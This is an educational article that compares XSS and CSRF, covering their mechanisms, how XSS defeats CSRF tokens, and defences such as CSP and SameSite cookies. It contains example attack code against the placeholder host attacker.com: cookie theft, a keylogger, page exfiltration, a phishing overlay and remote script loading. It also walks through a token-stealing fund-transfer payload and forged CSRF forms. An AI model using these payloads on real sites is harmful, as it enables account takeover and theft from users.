# XSS vs CSRF

XSS and CSRF are two of the most prevalent and well-studied client-side web security vulnerabilities, yet they operate through fundamentally different exploitation mechanisms and achieve different attack objectives—XSS injects malicious code into a trusted website to attack users visiting it, while CSRF exploits a user's authenticated relationship with a trusted website to perform unintended actions on their behalf. Understanding the precise distinctions between these attack types is critical not only for building effective defences, but also because the two vulnerabilities interact in subtle and dangerous ways: XSS can be used to completely defeat CSRF protections, and in certain narrow circumstances CSRF defences can incidentally block some forms of XSS exploitation, creating a deceptively complex relationship that security engineers must understand deeply to build robust, layered defences. While both vulnerabilities fall under the umbrella of client-side attacks that abuse user trust and authenticated browser sessions, XSS is generally considered the more severe of the two because it grants attackers arbitrary code execution in the victim's browser—providing a bidirectional channel to both perform actions and exfiltrate data—whereas CSRF is inherently one-directional and limited in scope, though both remain critical vulnerabilities capable of causing severe damage including full account takeover, data theft, and application-wide compromise when successfully exploited.

The fundamental distinction: **XSS executes attacker code in the victim's browser (code injection); CSRF uses the victim's browser to send attacker-crafted requests (request forgery)**.

## Core Difference

### How each attack works

```
XSS (Cross-Site Scripting):
Attack direction: Attacker → Target Site → Victim
Mechanism: Inject malicious script into trusted site
Victim's browser: Executes attacker's code in site's context
Trust exploited: Victim's trust in the website

CSRF (Cross-Site Request Forgery):
Attack direction: Attacker → Victim → Target Site
Mechanism: Trick victim's browser into sending forged request
Victim's browser: Sends request with session credentials attached
Trust exploited: Website's trust in the victim's browser

Key insight:
XSS:  Attacker compromises the site to attack users
CSRF: Attacker compromises users to attack the site
```

### Side-by-side comparison

| Dimension | XSS | CSRF |
|---|---|---|
| Attack vector | Inject code into target site | Trigger request from victim's browser |
| What is exploited | Victim's trust in the site | Site's trust in victim's browser |
| Directionality | Two-way (send + read responses) | One-way (send only, cannot read) |
| JavaScript required | Yes (attacker executes JavaScript) | No (works with HTML alone) |
| Victim interaction | Usually minimal or none | Usually minimal or none |
| Can steal data | Yes (reads responses, exfiltrates data) | No (cannot read cross-origin responses) |
| Can perform actions | Yes (any action the user can do) | Yes (limited to submittable requests) |
| Session cookie theft | Yes | No |
| Works against any action | Yes | Only predictable, forgeable actions |
| CSRF token stops it | Only in specific circumstances | Yes (when properly implemented) |
| Same-origin policy | Bypasses it (injected code runs same-origin) | Partially circumvents it |
| Persistence possible | Yes (stored XSS persists across sessions) | No (each attack requires a trigger) |

## Why XSS is More Severe

### Scope of impact

**XSS impact — unlimited scope:**

```
A single XSS vulnerability can:
✓ Perform ANY action the victim can perform
✓ Read ANY data the victim can access
✓ Exfiltrate data to attacker's server
✓ Steal session cookies → full session hijack
✓ Steal CSRF tokens → bypass CSRF protections
✓ Capture keystrokes (password stealing)
✓ Modify page appearance (phishing within trusted context)
✓ Redirect victim to attacker's site
✓ Install browser-based cryptominers
✓ Use victim's browser to attack other systems
✓ Persist via service worker or localStorage
✓ Escalate to other attack types

Critical: XSS in one function = compromise of EVERYTHING
         (Attacker steals CSRF tokens to bypass all protected endpoints)
```

**CSRF impact — limited scope:**

```
CSRF can only:
✓ Trigger HTTP requests the victim's browser can make
✓ Submit forms with predictable parameters
✓ Perform actions that don't require secrets attacker can't know
✓ Make GET/POST requests to target endpoints

CSRF cannot:
✗ Read responses from the target site
✗ Steal session cookies or tokens
✗ Access data visible on the victim's screen
✗ Bypass secret parameters (current password, CSRF token)
✗ Execute arbitrary code in the victim's browser
✗ Exfiltrate data directly
✗ Perform actions requiring knowledge of unpredictable values

Critical: CSRF is only viable for a SUBSET of application actions
         (Requires: no CSRF token + no secrets needed + cookie auth)
```

### Directionality — the fundamental difference

**XSS is two-way (bidirectional):**

```javascript
// Attacker's injected XSS script can:

// 1. SEND a request
const xhr = new XMLHttpRequest();
xhr.open('GET', '/account/settings', true);

// 2. READ the response (same-origin execution!)
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        const responseData = xhr.responseText;
        
        // 3. Extract sensitive data from response
        const csrfToken = responseData.match(/csrf_token.*?value="([^"]+)"/)[1];
        const accountDetails = responseData.match(/<div class="account">(.+?)<\/div>/s)[1];
        
        // 4. EXFILTRATE data to attacker's server
        fetch('https://attacker.com/steal?data=' + encodeURIComponent(accountDetails));
        
        // 5. USE stolen token for further attacks
        submitWithToken(csrfToken);
    }
};
xhr.send();

// Because XSS executes in the SAME ORIGIN as the target site:
// - Browser considers all requests same-origin
// - Same-origin policy does NOT restrict reading responses
// - Full bidirectional access to the application
```

**CSRF is one-way (unidirectional):**

```javascript
// CSRF can only trigger a request:
<form action="https://target.com/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

// CSRF cannot read the response:
// - Request crosses origin boundary (attacker.com → target.com)
// - Same-origin policy BLOCKS reading cross-origin responses
// - Attacker sends the request "blindly"
// - Cannot extract CSRF tokens from response
// - Cannot read current account data
// - Cannot know if request succeeded

// CSRF only provides:
// "I can make the victim's browser SEND this request"
// Not: "I can see what the server responded with"
```

### Action coverage comparison

```
Example application actions:

Action: View account balance
XSS: ✓ Can read and exfiltrate balance data
CSRF: ✗ Cannot read response, useless for data theft

Action: Change email address
XSS: ✓ Can perform (reads page, extracts CSRF token, submits)
CSRF: ✓ Can perform (if no CSRF token or token not validated)

Action: Transfer funds
XSS: ✓ Can perform regardless of CSRF protection
CSRF: ✓ Only if no CSRF token + amount/recipient predictable

Action: Change password
XSS: ✓ Can perform (even if requires current password - reads it via keylogger)
CSRF: ✗ Requires current password (attacker doesn't know it)

Action: Admin: delete any user
XSS: ✓ Can perform (steals CSRF token, submits as admin)
CSRF: ✓ If admin page lacks CSRF protection

Conclusion:
XSS access = ALL actions visible
CSRF access = SUBSET of actions meeting specific conditions
```

## Can CSRF Tokens Prevent XSS?

### The narrow scenario where yes, they can

**Reflected XSS without CSRF token (exploitable):**

```http
Vulnerable URL:
https://insecure-website.com/status?message=<script>alert(1)</script>

Attack flow:
1. Attacker crafts URL with XSS payload
2. Attacker tricks victim into visiting URL (phishing, etc.)
3. Server reflects message parameter into response
4. Victim's browser executes <script>alert(1)</script>
5. XSS exploited successfully!
```

**Reflected XSS with CSRF token (partially protected):**

```http
URL requires valid CSRF token:
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>alert(1)</script>

Server validates:
1. Request received with CSRF token
2. Server validates: Is CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz a valid token?
3. Valid? → Process request → XSS reflected → executes
4. Invalid/missing? → 403 Forbidden → XSS NOT reflected

Attack attempt from attacker's site:
https://insecure-website.com/status?csrf-token=ATTACKER_GUESS&message=<script>alert(1)</script>
↑ Attacker doesn't know valid CSRF token
↑ Server rejects request
↑ XSS payload never reaches victim!

Why it works:
Reflected XSS requires attacker to make victim visit a specific URL
That URL must include valid CSRF token
Attacker cannot forge a cross-site request with victim's CSRF token
(Cannot read victim's CSRF token due to Same-Origin Policy)
Cross-site exploitation blocked!
```

**The logic explained:**

```
Reflected XSS = Cross-Site Scripting
"Cross-site" = attack delivered via cross-site request

To exploit reflected XSS:
1. Attacker needs victim to visit: https://target.com/page?param=PAYLOAD
2. Victim must be logged in (for meaningful impact)
3. Attacker usually tricks victim via phishing/social media

If CSRF token required to access that page:
1. Attacker must provide valid CSRF token in URL
2. CSRF token is tied to victim's session
3. Attacker cannot know victim's CSRF token (cross-origin read blocked)
4. Attacker cannot construct valid URL with correct token
5. Request rejected → payload never reflected → XSS blocked

The CSRF token happens to also prevent this form of XSS!
```

### The critical caveats

**Caveat 1: Protection only covers CSRF-protected functions**

```
Application has multiple endpoints:

Endpoint 1: /email/change  (has CSRF token) → XSS reflected here: BLOCKED
Endpoint 2: /search         (no CSRF token) → XSS reflected here: STILL EXPLOITABLE!
Endpoint 3: /profile        (has CSRF token) → XSS reflected here: BLOCKED
Endpoint 4: /comments       (no CSRF token) → XSS reflected here: STILL EXPLOITABLE!

CSRF tokens on SOME functions ≠ XSS protection for ENTIRE application

If any endpoint lacks CSRF protection AND reflects user input:
XSS remains fully exploitable, regardless of other endpoints' protection

Real-world implication:
- Partial CSRF deployment creates false sense of security
- Attacker finds any unprotected endpoint with XSS
- Full XSS exploitation still possible from that entry point
```

**Caveat 2: XSS defeats CSRF tokens everywhere**

```javascript
// If ANY exploitable XSS exists on the site,
// CSRF tokens on ALL other functions become irrelevant

// Example: XSS exists on /blog/comments (unprotected page)
// CSRF token protects: /account/email, /account/password, /transfer

// Attacker's XSS payload:

// Step 1: Read CSRF-protected page to steal token
const attackScript = `
fetch('/account/settings', {
    credentials: 'same-origin'  // Include session cookies
})
.then(response => response.text())
.then(html => {
    // Step 2: Extract CSRF token from page
    const tokenMatch = html.match(/name="csrf_token" value="([^"]+)"/);
    const csrfToken = tokenMatch[1];
    
    // Step 3: Use stolen token to perform protected action
    return fetch('/account/email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'same-origin',
        body: 'email=attacker@evil.com&csrf_token=' + csrfToken
    });
})
.then(() => {
    // Step 4: Exfiltrate confirmation
    fetch('https://attacker.com/success');
});
`;

// Inject via stored XSS in /blog/comments page
// When any user visits blog:
// 1. XSS executes in SAME ORIGIN as target site
// 2. Reads CSRF-protected account settings page
// 3. Extracts valid CSRF token (same-origin allows reading!)
// 4. Submits email change with stolen token
// 5. CSRF protection completely bypassed!

// Key: XSS executes in same-origin context
//      Same-origin context can read any page on the site
//      CSRF tokens visible within same-origin context
//      CSRF protection rendered useless by XSS
```

**Caveat 3: Stored XSS ignores CSRF tokens entirely**

```html
<!-- Scenario: Form has CSRF token but also renders stored XSS -->

Server response for /account (CSRF-protected page):
<html>
<body>
    <!-- CSRF token present -->
    <form action="/account/email" method="POST">
        <input type="hidden" name="csrf_token" value="s3cureT0k3n">
        <input type="email" name="email">
        <button type="submit">Change Email</button>
    </form>
    
    <!-- But user's profile bio is rendered here (stored XSS) -->
    <div class="profile-bio">
        <!-- Attacker stored this in their bio: -->
        <script>
            // This executes when any user visits the page!
            document.cookie  // Has access to cookies
            document.querySelector('[name=csrf_token]').value  // Reads CSRF token!
            fetch('/account/email', {
                method: 'POST',
                body: 'email=attacker@evil.com&csrf_token=' + csrfToken
            });
        </script>
    </div>
</body>
</html>

Analysis:
1. CSRF token present in form ✓ (CSRF protection exists)
2. Stored XSS payload also present ✗ (XSS renders on page)
3. When victim visits /account:
   - XSS script executes in same-origin context
   - Reads CSRF token directly from DOM
   - Uses token to perform protected action
   - CSRF protection completely bypassed
4. CSRF token provided ZERO protection against stored XSS
```

```
Why stored XSS ignores CSRF tokens:

Stored XSS doesn't need a cross-site request:
- The payload is already stored in the database
- Executes when victim visits the page normally
- No cross-origin triggering required
- Runs in same-origin context with full DOM access
- Can read CSRF tokens, cookies, page content
- CSRF restriction was about "cross-site requests"
- Stored XSS requires NO cross-site request to execute!

Timeline comparison:
CSRF token blocks: Attacker (cross-site) → victim visits attacker's page → 
                   cross-origin form submission
Stored XSS: Attacker stored payload → victim visits TARGET site directly →
            same-origin execution (no cross-site request!)
```

## Interaction Scenarios

### Scenario 1: XSS to bypass CSRF

**Full attack walkthrough:**

```
Application:
- Banking website
- /transfer endpoint protected with CSRF token
- /blog/search has reflected XSS (no CSRF token)

Attack goal: Transfer victim's funds

Step 1: Find reflected XSS on unprotected page
URL: https://bank.com/blog/search?q=<script>PAYLOAD</script>
→ XSS confirmed on /blog/search

Step 2: Craft multi-stage payload

const payload = `
(async () => {
    // Stage 1: Fetch transfer page to get CSRF token
    const transferPage = await fetch('/account/transfer', {
        credentials: 'same-origin'
    });
    const html = await transferPage.text();
    
    // Stage 2: Extract CSRF token
    const csrf = html.match(/csrf_token.*?value="([^"]+)"/)[1];
    
    // Stage 3: Execute transfer with valid token
    await fetch('/account/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'same-origin',
        body: \`amount=10000&to=ATTACKER_ACCOUNT&csrf_token=\${csrf}\`
    });
    
    // Stage 4: Confirm to attacker
    new Image().src = 'https://attacker.com/done';
})();
`;

Step 3: URL-encode payload and deliver
https://bank.com/blog/search?q=<script>ENCODED_PAYLOAD</script>

Step 4: Victim visits URL (phishing, link, etc.)

Step 5: Attack executes:
- XSS runs in bank.com origin
- Reads transfer page (same-origin, allowed)
- Extracts valid CSRF token
- Transfers $10,000 to attacker
- CSRF protection completely bypassed!

Conclusion: XSS on ANY page = CSRF protection on ALL pages worthless
```

### Scenario 2: CSRF token incidentally blocks reflected XSS

```
Application:
- /search endpoint has reflected XSS
- /search requires valid CSRF token (for state-change tracking)

Normal XSS exploitation attempt:
Attacker crafts: https://site.com/search?q=<script>alert(1)</script>
Sends to victim
Victim visits URL
Server checks: Where is csrf_token parameter?
Missing → 403 Forbidden → XSS never reflected → XSS blocked!

Attacker cannot:
- Generate a URL with victim's CSRF token (can't read it cross-origin)
- Forge a cross-site request including the victim's token
- Exploit the XSS via cross-site delivery

CSRF token incidentally prevents XSS exploitation here!

BUT: This is narrow, fragile protection
- Only works if ALL entry points to XSS are CSRF-protected
- Only works for reflected XSS (not stored, DOM-based)
- Only works if CSRF validation is correct
- Only works if attacker uses cross-site delivery method
- Stored XSS still works regardless
```

### Scenario 3: DOM-based XSS (CSRF tokens irrelevant)

```javascript
// DOM-based XSS occurs entirely client-side
// No server request needed

// Vulnerable code:
const hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// Attack URL:
https://site.com/page#<img src=x onerror=alert(1)>

// What happens:
1. Victim clicks attacker's link
2. Page loads normally (no XSS in server response)
3. JavaScript reads location.hash
4. Injects hash content into innerHTML
5. XSS executes! (entirely client-side)

// CSRF token: COMPLETELY IRRELEVANT
// - No cross-site request needed
// - Server-side CSRF validation not involved
// - Attack is purely client-side
// - CSRF token cannot possibly block this
```

## Exploitation Techniques: XSS vs CSRF

### What attackers can do with each

**With XSS (full capabilities):**

```javascript
// 1. Session hijacking (steal cookies)
document.location = 'https://attacker.com/steal?cookie=' + document.cookie;

// 2. Credential harvesting (keylogging)
document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key);
});

// 3. Full page capture
fetch('https://attacker.com/page', {
    method: 'POST',
    body: document.documentElement.innerHTML
});

// 4. Phishing within trusted context
document.body.innerHTML = '<h1>Session expired</h1>' +
    '<form action="https://attacker.com/phish">' +
    '<input name="password" type="password" placeholder="Re-enter password">' +
    '<button>Login</button></form>';

// 5. CSRF token theft to bypass CSRF protection
const token = document.querySelector('[name=csrf_token]').value;
// Use token to perform any protected action

// 6. Persistent attack via service worker
navigator.serviceWorker.register('https://attacker.com/sw.js');
// Intercepts all future requests even after page navigation

// 7. Lateral movement (attack internal services)
fetch('http://internal-admin.company.local/admin/users');

// 8. Cryptomining
const script = document.createElement('script');
script.src = 'https://attacker.com/miner.js';
document.body.appendChild(script);
```

**With CSRF (limited capabilities):**

```html
<!-- 1. Change email address -->
<form action="https://target.com/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>

<!-- 2. Transfer funds (if parameters known) -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to_account" value="ATTACKER">
</form>

<!-- 3. Change settings (if no secret required) -->
<form action="https://target.com/settings/privacy" method="POST">
    <input type="hidden" name="profile_public" value="true">
</form>

<!-- 4. Delete resources -->
<img src="https://target.com/account/delete-post?id=123">

<!-- What CSRF CANNOT do: -->
<!-- ✗ Read account balance -->
<!-- ✗ Steal personal data -->
<!-- ✗ Capture session cookie -->
<!-- ✗ Perform actions requiring unknown values -->
<!-- ✗ Execute arbitrary code -->
```

## Defence Comparison

### What stops each attack

```
XSS Prevention (primary):
✓ Context-aware output encoding
✓ Input validation (allowlist)
✓ Content Security Policy (blocks inline execution)
✓ Trusted sanitization libraries (DOMPurify)
✓ Safe DOM APIs (textContent over innerHTML)
✓ Framework auto-escaping (React, Vue, Angular)

CSRF Prevention (primary):
✓ CSRF tokens (per-session or per-request)
✓ SameSite cookie attribute (Lax or Strict)
✓ Custom request headers (for AJAX)
✓ Origin/Referer header validation (supplementary)

What DOES NOT work as XSS protection:
✗ CSRF tokens alone (only blocks narrow reflected XSS scenarios)
✗ SameSite cookies (XSS runs same-origin, cookies not relevant)
✗ Referer header validation (XSS runs same-origin)

What DOES NOT work as CSRF protection:
✗ Output encoding (doesn't affect forged requests)
✗ Content Security Policy (doesn't block cross-origin forms)
✗ DOMPurify (server-side request forgery isn't DOM-related)
```

### CSP interaction with both attacks

```
Content-Security-Policy: script-src 'nonce-RANDOM'; object-src 'none'

Effect on XSS:
✓ Blocks inline script injection (no nonce)
✓ Blocks external script loading
✓ Reduces XSS exploitability significantly
✓ But: doesn't prevent injection, just limits execution

Effect on CSRF:
✗ No effect on CSRF
✗ HTML form submissions not blocked by script-src
✗ img src requests for GET-based CSRF not blocked
✗ CSP is not a CSRF control
```
